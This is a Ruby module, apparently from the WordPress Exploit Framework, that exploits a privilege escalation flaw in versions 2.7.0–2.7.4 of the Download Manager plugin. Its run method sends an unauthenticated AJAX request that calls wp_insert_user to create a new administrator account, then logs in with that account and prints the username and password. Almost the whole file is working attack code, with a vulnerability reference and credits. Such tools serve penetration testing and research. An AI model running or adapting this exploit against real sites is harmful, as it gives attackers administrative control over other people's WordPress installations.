require 'socket'

class Wpxf::Auxiliary::DownloadManagerPrivilegeEscalation < Wpxf::Module
  include Wpxf
  include Wpxf::WordPress::Login

  def initialize
    super

    update_info(
      name: 'Download Manager Privilege Escalation',
      desc: 'The Download Manager plugin, in versions 2.7.0 to 2.7.4, '\
            'allows unauthenticated users to create new admin users '\
            'due to lack of validation wpdm_ajax_call_exec.',
      author: [
        'Mickael Nadeau',                 # Vulnerability discovery
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['EDB', '35533'],
        ['OSVDB', '115287'],
        ['WPVDB', '7706']
      ],
      date: 'Dec 3 2014'
    )

    register_options([
      StringOption.new(
        name: 'username',
        desc: 'The username to register with',
        default: Utility::Text.rand_alpha(10)
      ),
      StringOption.new(
        name: 'password',
        desc: 'The password to register with',
        default: Utility::Text.rand_alpha(rand(10..20))
      )
    ])
  end

  def username
    normalized_option_value('username')
  end

  def password
    normalized_option_value('password')
  end

  def check
    check_plugin_version_from_readme('download-manager', '2.7.5', '2.7.0')
  end

  def uploads_url
    normalize_uri(wordpress_url_wp_content, 'uploads', 'download-manager-files')
  end

  def run
    return false unless super

    emit_info 'Creating new admin user...'
    res = execute_post_request(
      url: full_uri,
      body: {
        'action'      => 'wpdm_ajax_call',
        'execute'     => 'wp_insert_user',
        'user_login'  => username,
        'user_pass'   => password,
        'role'        => 'administrator'
      }
    )

    emit_info "Response code: #{res.code}", true
    emit_info "Response body: #{res.body}", true

    emit_info 'Verifying new account...'
    if wordpress_login(username, password)
      emit_success "User #{username} with password #{password} successfully created"
      return true
    else
      emit_error 'Failed to create new user'
      return false
    end

    if res.nil? || res.timed_out?
      emit_error 'No response from the target'
      return false
    end

    return true
  end
end
